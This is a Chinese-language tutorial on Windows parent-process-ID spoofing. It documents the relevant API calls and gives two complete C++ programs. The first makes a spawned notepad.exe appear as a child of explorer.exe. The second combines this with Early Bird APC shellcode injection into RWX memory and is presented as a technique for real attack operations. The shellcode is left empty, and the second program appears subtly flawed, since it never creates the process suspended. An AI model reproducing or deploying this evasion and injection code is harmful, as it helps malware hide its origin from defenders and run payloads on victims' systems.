# PPID Spoofing

PPID欺骗指的是在计算机系统中伪造父进程ID（Process ID）的行为。进程ID是操作系统为每个正在运行的进程分配的唯一标识符，用于管理和跟踪进程。伪造PPID的目的是欺骗系统或其他进程，使其认为某个进程是由另一个进程创建的，从而隐藏其真实来源或绕过安全检查。

#### 核心函数

**UpdateProcThreadAttribute**

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute

`UpdateProcThreadAttribute`是Windows操作系统提供的一个函数，用于更新正在运行的进程或线程的属性。这个函数通常与`CreateProcess`或`CreateThread`函数结合使用，用于设置进程或线程的特定属性。

```c++
BOOL UpdateProcThreadAttribute(
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  DWORD                         dwFlags,
  DWORD_PTR                     Attribute,
  PVOID                         lpValue,
  SIZE_T                        cbSize,
  PVOID                         lpPreviousValue,
  PSIZE_T                       lpReturnSize
);
```

参数说明：

- `lpAttributeList`：指向`PROC_THREAD_ATTRIBUTE_LIST`结构的指针，该结构包含了要更新的进程或线程的属性列表。
- `dwFlags`：更新属性的标志，目前必须为0。
- `Attribute`：要更新的属性类型，可以是一个常量，如`PROC_THREAD_ATTRIBUTE_HANDLE_LIST`。
- `lpValue`：指向新属性值的指针。
- `cbSize`：`lpValue`指向的数据的大小，以字节为单位。
- `lpPreviousValue`：指向之前属性值的指针，如果不需要可以设置为NULL。
- `lpReturnSize`：指向一个`SIZE_T`变量的指针，用于接收函数返回的属性值的大小。



**CreateProcessA**

https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa

`CreateProcessA` 是 Windows 操作系统提供的一个函数，用于创建一个新的进程或线程。

```c++
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

- `lpApplicationName`：可执行文件的名称。如果此参数为 NULL，则命令行参数在括号中指定的程序名称会被当作可执行文件名。`lpCommandLine` 参数不应包含路径信息；当 `lpApplicationName` 参数指定可执行文件的路径时， `lpCommandLine` 参数应包含应用程序的文件名部分（如，cmd.exe）。如果命令行字符串引用了带空格的路径名，则该字符串必须用引号括起来。
- `lpCommandLine`：命令行参数字符串。命令行字符串可以包含应用程序名称、命令行参数以及任何必要的引号。在这个参数中指定的字符串被传递给正在创建的进程。如果 `lpApplicationName` 参数为空，模块名的第一个字符串将被用来指定可执行模块的名称。
- `lpProcessAttributes`：进程句柄的安全属性（一般设置为 `NULL`）。
- `lpThreadAttributes`：线程句柄的安全属性（一般设置为 `NULL`）。
- `bInheritHandles`：指定新进程是否从调用进程继承句柄。
- `dwCreationFlags`：控制进程的创建方式，例如是否为新进程创建一个新的控制台窗口，以及新进程的优先级等。
- `lpEnvironment`：指定环境块的指针。这些变量用于新进程的环境块。如果此参数为 `NULL`，则新进程使用调用进程的环境。
- `lpCurrentDirectory`：字符串指针，指定新进程的当前目录。如果此参数为空，新进程使用与调用进程相同的当前目录。
- `lpStartupInfo`：指向一个 `STARTUPINFO` 结构的指针，该结构指定了新进程的主窗口特性。
- `lpProcessInformation`：指向一个 `PROCESS_INFORMATION` 结构的指针，该结构返回新进程的标识信息。



#### 代码示例

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 获取目标进程pid
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main(void) {  
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // 初始化STARTUPINFOEX结构体
    STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;

    // 获取指定进程的PID
    dwPid = GetPidByName("explorer.exe");
    if (dwPid == 0)
        dwPid = GetCurrentProcessId();

    // 初始化进程线程属性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // 打开指定PID的进程句柄
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    // 更新进程线程属性，伪造父进程
    UpdateProcThreadAttribute(pAttributeList,
                                0,
                                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                &hParentProcess,
                                sizeof(HANDLE),
                                NULL,
                                NULL);

    info.lpAttributeList = pAttributeList;

    // 创建新的进程，使其具有不同的父进程
    CreateProcessA(NULL,
                    (LPSTR) "notepad.exe",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    // 等待一段时间以查看父子关系
    Sleep(30000);

    // 清理资源
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(hParentProcess);

    return 0;
}

```

通过以上代码进行实验可以看到，notepad.exe的父进程变成了explorer.exe

在实战中可以配合进程注入进行利用，创建一个进程修改其父进程并将shellcode注入到此进程中。

```c++
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>

// 获取目标进程pid
DWORD GetPidByName(const char * pName) {
    PROCESSENTRY32 pEntry;
    HANDLE snapshot;

    pEntry.dwSize = sizeof(PROCESSENTRY32);
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &pEntry) == TRUE) {
        while (Process32Next(snapshot, &pEntry) == TRUE) {
            if (_stricmp(pEntry.szExeFile, pName) == 0) {
                return pEntry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

int main(void) {  
  	unsigned char shellcode[] = "";
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    // 初始化STARTUPINFOEX结构体
    STARTUPINFOEX info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    SIZE_T cbAttributeListSize = 0;
    PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD dwPid = 0;

    // 获取指定进程的PID
    dwPid = GetPidByName("explorer.exe");
    if (dwPid == 0)
        dwPid = GetCurrentProcessId();

    // 初始化进程线程属性列表
    InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
    pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST) HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
    InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize);

    // 打开指定PID的进程句柄
    hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
    // 更新进程线程属性，伪造父进程
    UpdateProcThreadAttribute(pAttributeList,
                                0,
                                PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                &hParentProcess,
                                sizeof(HANDLE),
                                NULL,
                                NULL);

    info.lpAttributeList = pAttributeList;

    // 创建新的进程，使其具有不同的父进程
    CreateProcessA(NULL,
                    (LPSTR) "notepad.exe",
                    NULL,
                    NULL,
                    FALSE,
                    EXTENDED_STARTUPINFO_PRESENT,
                    NULL,
                    NULL,
                    &info.StartupInfo,
                    &processInfo);

    // Early Bird APC注入
		LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(processInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		WriteProcessMemory(processInfo.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
		QueueUserAPC((PAPCFUNC)lpBaseAddress, processInfo.hThread, NULL);
		ResumeThread(processInfo.hThread);
    // 清理资源
    DeleteProcThreadAttributeList(pAttributeList);
    CloseHandle(hParentProcess);

    return 0;
}

```

